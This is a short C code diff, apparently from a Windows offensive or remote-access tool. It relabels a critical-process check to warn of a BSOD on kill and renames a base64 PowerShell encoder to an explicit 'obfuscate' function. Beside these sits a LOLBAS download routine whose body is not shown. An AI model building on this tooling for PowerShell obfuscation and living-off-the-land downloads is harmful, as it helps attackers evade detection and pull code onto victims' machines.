@@ -343,7 +343,7 @@ const char* sys_check_critical_status_with_name(void) {
         return buf;
     }
     if (isCritical) {
-        snprintf(buf, sizeof(buf), "[PROTECTED] [%s]", filename);
+        snprintf(buf, sizeof(buf), "[CRITICAL — BSOD on kill] [%s]", filename);
     } else {
         snprintf(buf, sizeof(buf), "[NORMAL] [%s]", filename);
     }
@@ -630,7 +630,7 @@ void sys_lolbas_download(const char *url, const char *outPath) {
 }
 
 /* 5. PowerShell Obfuscation — base64 encode (this is benign enough to keep) */
-char* sys_encode_cmd(const char *command) {
+char* sys_obfuscate_ps(const char *command) {
     static char result[NET_BUF_SIZE];
     
     int wlen = MultiByteToWideChar(CP_UTF8, 0, command, -1, NULL, 0);
